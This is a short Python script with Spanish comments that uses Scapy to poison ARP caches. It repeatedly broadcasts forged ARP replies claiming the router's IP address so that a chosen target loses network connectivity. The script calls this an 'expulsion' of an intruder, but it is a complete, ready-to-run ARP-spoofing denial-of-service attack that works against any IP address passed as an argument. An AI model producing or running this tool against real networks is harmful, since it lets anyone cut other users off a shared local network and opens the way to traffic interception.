from scapy.all import ARP, Ether, sendp
import sys
import time

# Argumentos: IP del Intruso y IP del Router
target_ip = sys.argv[1]
gateway_ip = sys.argv[2]

print(f"[*] Ejecutando protocolo de expulsion persistente contra {target_ip}...")

def poison():
    # Creamos un paquete de Capa 2 (Ethernet) + Capa 3 (ARP)
    # Enviamos a la direccion de broadcast (ff:ff:ff:ff:ff:ff) para forzar la actualizacion
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
    
    # sendp se usa para enviar paquetes en Capa 2 (Ethernet)
    sendp(packet, verbose=False, count=2)

try:
    while True:
        poison()
        # Inundamos la red cada 0.5 segundos para que el intruso no pueda recuperarse
        time.sleep(0.5) 
except KeyboardInterrupt:
    print("\n[*] Ataque detenido por el usuario.")
